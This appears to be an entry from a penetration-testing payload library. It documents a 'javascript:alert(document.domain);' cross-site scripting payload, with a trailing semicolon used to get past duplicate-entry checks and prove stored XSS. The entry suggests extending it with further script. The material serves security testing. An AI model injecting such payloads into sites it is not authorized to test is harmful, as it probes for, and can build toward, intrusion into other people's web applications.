---
data: 'javascript:alert(document.domain);'
tags:
  - xss
  - bypass
  - test
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:12.650Z'
id: c8f90d29-dbd4-48f5-9c5a-605240cb96f0
verified: false
validated: true
submitted: true
---
# javascript-alert-domain-semicolon

## Command

```javascript
javascript:alert(document.domain);
```

## Description

Variant of the domain alert payload with a trailing semicolon to differentiate from identical injections, bypassing duplicate checks in forms while still alerting the execution context to prove stored XSS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | Semicolon for bypass; core alert unchanged | No |

## Examples

### Basic Usage

```javascript
javascript:alert(document.domain);
```

Use in fields with duplicate validation.

### Advanced Usage

Extend with more JS after semicolon if needed.

## Expected Output

Alert box displaying the current document domain.

## Related

- [[commands/javascript-alert-domain]]
- [[commands/javascript-eval-stealthy]]
